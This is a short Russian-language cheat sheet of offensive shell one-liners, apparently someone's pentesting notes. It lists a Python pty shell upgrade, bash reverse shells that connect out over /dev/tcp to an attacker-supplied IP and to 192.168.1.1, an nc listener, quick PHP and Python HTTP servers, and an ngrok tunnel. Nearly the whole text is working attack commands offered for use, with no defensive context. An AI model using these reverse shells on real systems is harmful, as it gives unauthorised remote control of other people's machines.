```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
аналог nc:
```bash
bash -c "bash -i >& /dev/tcp/{your_IP}/{your_listeniing_port} 0>&1"
```

поднять сервер:

```php
php -S {ip}:{port}
```
```python
python3 -m http.server {port}
```
```bash
ngrok http 9001
```
выполнить подключение:
слушать порт:
```
nc -lvnp {port}
```
подключиться к прослушиваемому порту:
``` 
bash -i >& /dev/tcp/192.168.1.1/{port} 0>&1
```